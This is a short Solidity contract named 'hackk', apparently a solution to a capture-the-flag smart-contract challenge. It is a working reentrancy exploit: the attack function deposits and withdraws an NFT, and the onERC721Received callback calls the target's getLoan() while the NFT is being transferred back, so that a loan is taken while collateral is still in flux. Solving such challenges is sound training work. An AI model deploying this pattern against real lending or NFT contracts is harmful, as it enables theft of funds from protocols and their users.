pragma solidity ^0.8;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface CTF{
  
  function nft() external;
  function depositNFT() external;
  function getLoan() external;
  function withdrawNFT() external;
}
interface NFT{
  function getNFT() external;
  function approve(address, uint) external;
  function ownerOf(uint) external;
}
contract hackk{
  bool public flag;
  CTF private immutable target;
  NFT private immutable nft;
  constructor(address _target, address _nft){
    target = CTF(_target);
    nft = NFT(_nft);



  }
  function attack() public{
    nft.getNFT();
    nft.approve(address(target), 1);
    target.depositNFT();
    target.withdrawNFT();

  }
  function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        

        target.getLoan();

        return IERC721Receiver.onERC721Received.selector;

    }
  
  }